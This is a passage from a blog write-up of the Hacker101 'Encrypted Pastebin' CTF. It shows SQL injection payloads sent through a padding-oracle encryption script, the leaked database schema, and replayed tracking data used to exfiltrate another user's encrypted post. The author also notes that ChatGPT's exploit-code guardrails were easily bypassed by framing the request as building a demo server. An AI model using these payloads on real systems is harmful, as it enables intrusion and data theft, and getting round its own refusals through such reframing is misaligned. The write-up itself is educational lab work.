+</code></pre><p>This would return a single row and the error message would leak
+the data for me:</p>
+<p>It worked! Well, sort of.</p>
+<pre tabindex=0><code>% curl 'https://server_id.ctf.hacker101.com?post=0cyg6z9m6BCTV!oohCM!!7OQOjm[..]60I-OgCw~~'
+Attempting to decrypt page with title: odFZbP-NggUpoMbKiRuT03rC-hgz9jGEmk81mfFnT1fI0RJ2MYkJQL1uPdCa2nihi6zki-!n0NXtG7cjxYYD0tewPqU2gD0KqeFSeiwzEGOuKuvhbWTqVORfXrRIX0at
+Traceback (most recent call last):
+  File &quot;./main.py&quot;, line 74, in index
+    body = decryptPayload(post['key'], body)
+  File &quot;./common.py&quot;, line 37, in decryptPayload
+    return unpad(cipher.decrypt(data))
+  File &quot;/usr/local/lib/python2.7/site-packages/Crypto/Cipher/blockalgo.py&quot;, line 295, in decrypt
+    return self._cipher.decrypt(ciphertext)
+ValueError: Input strings must be a multiple of 16 in length
+</code></pre><p>So I got the raw payload, but failed the encryption. This was because the
+JSON payload looks like this:</p>
+<div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2>
+<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
+<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">5
+</span></code></pre></td>
+<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
+<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-json data-lang=json>{
+  <span style=color:#ff79c6>&#34;flag&#34;</span>: <span style=color:#f1fa8c>&#34;^FLAG^4cc4809ce[..]3b$FLAG$&#34;</span>, 
+  <span style=color:#ff79c6>&#34;id&#34;</span>: <span style=color:#f1fa8c>&#34;4&#34;</span>, 
+  <span style=color:#ff79c6>&#34;key&#34;</span>: <span style=color:#f1fa8c>&#34;zNQ!rEXnxjQBhzLh-kP6ug~~&#34;</span>
+}
+</code></pre></td></tr></table>
+</div>
+</div><p>The key is randomly generated. And never stored on the server. What to do?</p>
+<p>I (very) briefly thought that possibly another padding oracle attack could work. But that
+was going to take forever, because in order to try a single key, I&rsquo;d have to run
+the padding oracle to encrypt the payload, which takes on average 128 requests for a single byte.
+Not practical.</p>
+<h1 id=exploring-the-database>Exploring the database</h1>
+<p>I was thinking, I had a way of extracting information from the database, why don&rsquo;t
+I look around to see what else is there?</p>
+<p>That&rsquo;s when I went back to ChatGPT. I asked it for a way to aggregate information
+in MariaDB so that multiple rows and columns could be returned as a single field.</p>
+<p>This is what it came up with:</p>
+<pre tabindex=0><code>0 
+union 
+SELECT GROUP_CONCAT(
+  CONCAT(
+    table_schema,':',
+    table_name,':',
+    column_name,':',
+    column_type)
+  ), 
+  'x' 
+  FROM information_schema.columns 
+ where table_schema!='information_schema'
+</code></pre><p>Off my little oracle went:</p>
+<pre tabindex=0><code>% python padding-oracle.py --encrypt $'{&quot;id&quot;:&quot;0 union SELECT GROUP_CONCAT(CONCAT(table_schema,\':\',table_name,\':\',column_name,\':\',column_type)), \'x\' FROM information_schema.columns where table_schema!=\'information_schema\'&quot;,&quot;key&quot;: &quot;2YWjdCO616G47N2-Kqd2ww~~&quot;}' --workers 4
+[client] Encrypting plaintext via oracle...
+[encrypt] Recovering intermediate D(C_14) for plaintext block 14/14...
+[progress] Block 14/14 Byte 1/16 Requests: 213 Retries: 0 -&gt; Recovered: 0xd5 ('.')
+[..]
+[progress] Block 1/14 Byte 15/16 Requests: 44 Retries: 0 -&gt; Recovered: 0x22 ('&quot;')
+[progress] Block 1/14 Byte 16/16 Requests: 203 Retries: 0 -&gt; Recovered: 0xda ('.')
+[client] Ciphertext (custom-base64): oQA4Snsw4UojribiBpZ[..]8Eljp
+</code></pre><p>28,827 requests later I had my payload. And when I ran that:</p>
+<pre tabindex=0><code>% curl 'https://server_id.ctf.hacker101.com/?post=oQA4Snsw4UojribiB[..]jBYY8Eljp'
+Attempting to decrypt page with title: 
+  level3:posts:id:int(11),
+  level3:posts:title:text,
+  level3:posts:body:mediumtext,
+  level3:tracking:id:int(11),
+  level3:tracking:headers:mediumtext,
+  mysql:column_stats:db_name:varchar(64),
+  mysql:column_stats:table_name:varchar(64),
+  [..]
+Traceback (most recent call last):
+  File &quot;./main.py&quot;, line 74, in index
+    body = decryptPayload(post['key'], body)
+  File &quot;./common.py&quot;, line 34, in decryptPayload
+    data = b64d(data)
+  File &quot;./common.py&quot;, line 11, in &lt;lambda&gt;
+    b64d = lambda x: base64.decodestring(x.replace('~', '=').replace('!', '/').replace('-', '+'))
+  File &quot;/usr/local/lib/python2.7/base64.py&quot;, line 328, in decodestring
+    return binascii.a2b_base64(s)
+Error: Incorrect padding
+</code></pre><p>So now I knew:</p>
+<ul>
+<li>the name of the schema</li>
+<li>the name of two tables (posts and tracking)</li>
+<li>the column names and types</li>
+</ul>
+<h1 id=tracking>Tracking?</h1>
+<p>Where would tracking come into place? Well, if you look back at the response when
+decrypting:</p>
+<pre tabindex=0><code>&lt;h1&gt;test title&lt;/h1&gt;
+&lt;pre&gt;
+  test body
+&lt;/pre&gt;
+&lt;img src=&quot;tracking.gif&quot;&gt;
+</code></pre><p>There&rsquo;s a tracking image. The image itself is just a 1-pixel GIF. But what may hide
+in the tracking table?</p>
+<p>So let&rsquo;s inject some more SQL:</p>
+<pre tabindex=0><code>0 
+union 
+select 
+  GROUP_CONCAT(CONCAT(id,':',headers)), 
+  '' 
+ from tracking
+</code></pre><p>Again, some time later using the padding oracle attack, we got our output:</p>
+<pre tabindex=0><code>% curl 'https://server_id.ctf.hacker101.com/?post=4qZgAs9fLYMsaI9YR[..]
+Attempting to decrypt page with title: 
+1:Referer: http://127.0.0.1:14807/?post=JgYvMmP8TbmTddC0[..]
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36
+Connection: close
+Host: 127.0.0.1:14807
+Accept: image/webp,image/apng,image/*,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Accept-Encoding: gzip, deflate
+
+,
+2:Referer: https://server_id.ctf.hacker101.com/
+X-Forwarded-Port: 443
+Priority: u=5, i
+User-Agent: Mozilla/5.0 [..]
+Connection: close
+Sec-Fetch-Dest: image
+X-Amzn-Trace-Id: Root=1-69105305-2fdb39d310549ba50134fc6b
+X-Forwarded-Proto: https
+Sec-Fetch-Mode: no-cors
+Host: server+id.ctf.hacker101.com
+Sec-Fetch-Site: same-origin
+Accept: image/webp,image/avif,image/jxl,image/heic,image/heic-sequence,video/*;q=0.8,image/png,image/svg+xml,image/*;q=0.8
+Traceback (most recent call last):
+  File &quot;./main.py&quot;, line 74, in index
+    body = decryptPayload(post['key'], body)
+  File &quot;./common.py&quot;, line 36, in decryptPayload
+    cipher = AES.new(b64d(key), AES.MODE_CBC, iv)
+  File &quot;/usr/local/lib/python2.7/site-packages/Crypto/Cipher/AES.py&quot;, line 95, in new
+    return AESCipher(key, *args, **kwargs)
+  File &quot;/usr/local/lib/python2.7/site-packages/Crypto/Cipher/AES.py&quot;, line 59, in __init__
+    blockalgo.BlockAlgo.__init__(self, _AES, key, *args, **kwargs)
+  File &quot;/usr/local/lib/python2.7/site-packages/Crypto/Cipher/blockalgo.py&quot;, line 141, in __init__
+    self._cipher = factory.new(key, *args, **kwargs)
+ValueError: IV must be 16 bytes long
+</code></pre><p>Turns out the tracking table stores all the request headers from requests made
+to &ldquo;tracking.gif&rdquo;. And we had two rows in there. One (id=2) is our request. And another
+one made to a URL to 127.0.0.1 with the encrypted post payload.</p>
+<p>Let&rsquo;s try that:</p>
+<pre tabindex=0><code>% curl 'https://server_id.ctf.hacker101.com/?post=4qZgAs9fLYMsaI9YR[..]
+&lt;html&gt;
+  &lt;head&gt;
+    &lt;title&gt;^FLAG^8b1f3342d[..]0ba69e65$FLAG$ -- Encrypted Pastebin&lt;/title&gt;
+  &lt;/head&gt;
+  &lt;body&gt;
+    &lt;h1&gt;^FLAG^8b1f3342df6e[..]9e65$FLAG$&lt;/h1&gt;
+    &lt;pre&gt;
+      ^FLAG^cc500372296[..]0a5541b55e1$FLAG$
+    &lt;/pre&gt;
+    &lt;img src=&quot;tracking.gif&quot;&gt;
+  &lt;/body&gt;
+&lt;/html&gt;
+</code></pre><p>And there we have it. Flag 4. Exfiltration of someone elses encrypted payload without
+needing to know their encryption key.</p>
+<h1 id=conclusion>Conclusion</h1>
+<p>This Hacker101 CTF was a lot of fun as it combined:</p>
+<ul>
+<li>encryption</li>
+<li>padding oracles</li>
+<li>SQL injection</li>
+<li>data exfiltratoin</li>
+</ul>
+<p>It demonstrates what can go wrong when a service</p>
+<ul>
+<li>leaks stack traces</li>
+<li>has overly verbose error messages</li>
+<li>uses outdated encryption (CBC shouldn&rsquo;t be used anymore)</li>
+<li>leaks keys in URLs</li>
+<li>doesn&rsquo;t protect tracking information</li>
+</ul>
+<p>I also found it a lot of fun and frustrating at the same time to vibe-code the python
+script running the padding oracle attack. It was quite useful to be able to add features
+around printing status messages and getting the algorithm right without too much
+thinking. The fact that the guardrails against writing exploit code (&ldquo;help me
+create a demo server&rdquo;) were easily circumvented doesn&rsquo;t really surprise me.</p>
+<p>For me I&rsquo;d always wondered what was behind those vulnerability CVEs on
+padding oracles. Now I understand the impact a lot better. And having a way to decrypt
+payloads without needing to know the key is rather neat!</p>
+<p>I hope you enjoyed following along!</p>
+<b>Tags</b>
+<a href=https://beny23.github.io/tags/appsec/>appsec</a> <a href=https://beny23.github.io/tags/ctf/>ctf</a> <a href=https://beny23.github.io/tags/cryptography/>cryptography</a>
+<p>
+If you'd like to find more of my writing, why not follow me on
+<a href=https://bsky.app/profile/beny23.github.io title="BlueSky link" rel=noopener aria-label="follow on BlueSky - Opens in a new window">Bluesky</a> or
+<a href=https://infosec.exchange/@beny23 title="Mastodon link" rel=noopener aria-label="follow on Mastodon - Opens in a new window">Mastodon</a>?
+</p>
+<div class="mt6 instapaper_ignoref">
+</div>
+</div>
+<aside class="w-30-l mt6-l">
+<div class="bg-light-gray pa3 nested-list-reset nested-copy-line-height nested-links">
+<p class="f5 b mb3">Related</p>
+<ul class="pa0 list">
+<li class=mb2>
+<a href=/posts/bsides_ncl_2025/>BSides Newcastle 2025: Mission to Cyberspace</a>
+</li>
+<li class=mb2>
+<a href=/posts/make_it_so_genai_and_zap/>Make it so: GenAI, OpenAPI and ZAP</a>
+</li>
+<li class=mb2>
+<a href=/posts/cyber_manchester_2024/>Cyber Measures Up in Manchester</a>
+</li>
+<li class=mb2>
+<a href=/posts/my_take_on_compliance_in_modern_dev/>Resisting compliance is futile</a>
+</li>
+<li class=mb2>
+<a href=/posts/appsec_loves_agile/>AppSec loves Agile</a>
+</li>
+<li class=mb2>
+<a href=/posts/bsides_ncl_2023/>BSides Newcastle 2023: Chaos for the future</a>
+</li>
+<li class=mb2>
+<a href=/posts/automatic_dependency_updates/>The Case Against Automatic Dependency Updates</a>
+</li>
+<li class=mb2>
+<a href=/posts/harvesting_logs_for_fun_and_profit/>Harvesting Logs for Fun and Profit</a>
+</li>
+<li class=mb2>
+<a href=/posts/why_appsec_fails/>Why AppSec fails</a>
+</li>
+<li class=mb2>
+<a href=/posts/precision_munitions_for_denial_of_service/>Precision Munitions for Denial of Service</a>
+</li>
+<li class=mb2>
+<a href=/posts/curating_vulnerabilities/>Curating Dependency Vulnerabilities</a>
+</li>
+</ul>
+</div>
+</aside>
+</article>
+</main>
+<footer class="bg-black bottom-0 w-100 pa3" role=contentinfo>
+<div class="flex justify-between">
+<a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href=https://beny23.github.io/>
+&copy; Software Design Systems 2025
+</a>
+<div>
+<a href=https://stackoverflow.com/users/227140/beny23 target=_blank class="link-transition stackoverflow link dib z-999 pt3 pt0-l mr1" title="Stack Overflow link" rel=noopener aria-label="follow on Stack Overflow——Opens in a new window"><svg height="32" style="enable-background:new 0 0 67 67" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="32"><path d="M12 0C5.373.0.0 5.373.0 12s5.373 12 12 12 12-5.373 12-12S18.627.0 12 0zm.869 5.903 3.114 4.567-.975.665-3.115-4.567.976-.665zm-2.812 2.585 4.84 2.838-.6 1.017-4.842-2.838.602-1.017zm-1.276 2.724 5.413 1.521-.291 1.077-5.428-1.458.306-1.14zm-.588 2.461 5.687.569-.103 1.12-5.691-.513.107-1.176zm-.169 2.16h5.835V17H8.024v-1.167zM16 19H6v-6h1v5h8v-5h1v6zm.195-8.602-.945-5.446 1.162-.202.947 5.446-1.164.202z"/></svg>
+<span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
+</span></a>
+<a href=https://www.linkedin.com/in/gerald-benischke-9811b663 target=_blank class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel=noopener aria-label="follow on LinkedIn——Opens in a new window"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
+<span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
+</span></a>
+<a href=https://github.com/beny23 target=_blank class="link-transition github link dib z-999 pt3 pt0-l mr1" title="Github link" rel=noopener aria-label="follow on Github——Opens in a new window"><svg height="32" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
+<span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
+</span></a>
+<a href=https://infosec.exchange/@beny23 target=_blank class="link-transition mastodon link dib z-999 pt3 pt0-l mr1" title="Mastodon link" rel=noopener aria-label="follow on Mastodon——Opens in a new window"><svg height="32" style="enable-background:new 0 0 230 230" viewBox="0 0 230 230" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M211.80683 139.0875c-3.1825 16.36625-28.4925 34.2775-57.5625 37.74875-15.16 1.80875-30.0825 3.47125-45.99875 2.74125-26.0275-1.1925-46.565-6.2125-46.565-6.2125.0 2.53375.15625 4.94625.46875 7.2025 3.38375 25.68625 25.47 27.225 46.3925 27.9425 21.115.7225 39.91625-5.20625 39.91625-5.20625l.86875 19.09s-14.77 7.93125-41.08125 9.39c-14.50875.7975-32.52375-.365-53.50625-5.91875C9.23183 213.82 1.40558 165.31125.20808 116.09125c-.36375-14.61375-.14-28.39375-.14-39.91875.0-50.33 32.97625-65.0825 32.97625-65.0825C49.67058 3.45375 78.20308.2425 107.86433.0h.72875c29.66125.2425 58.21125 3.45375 74.8375 11.09.0.0 32.97625 14.7525 32.97625 65.0825.0.0.4125 37.13375-4.6 62.915" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/><path d="M65.68743 96.45938c0 9.01375-7.3075 16.32125-16.3225 16.32125-9.01375.0-16.32-7.3075-16.32-16.32125.0-9.01375 7.30625-16.3225 16.32-16.3225 9.015.0 16.3225 7.30875 16.3225 16.3225M124.52893 96.45938c0 9.01375-7.30875 16.32125-16.3225 16.32125s-16.32125-7.3075-16.32125-16.32125c0-9.01375 7.3075-16.3225 16.32125-16.3225 9.01375.0 16.3225 7.30875 16.3225 16.3225M183.36933 96.45938c0 9.01375-7.3075 16.32125-16.32125 16.32125s-16.32125-7.3075-16.32125-16.32125c0-9.01375 7.3075-16.3225 16.32125-16.3225s16.32125 7.30875 16.32125 16.3225" fill="#fff"/></svg>
+<span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
+</span></a>
+</div>
+</div>
+</footer>
+<script src=/dist/js/app.3fc0f988d21662902933.js></script>
+</body>
+</html>
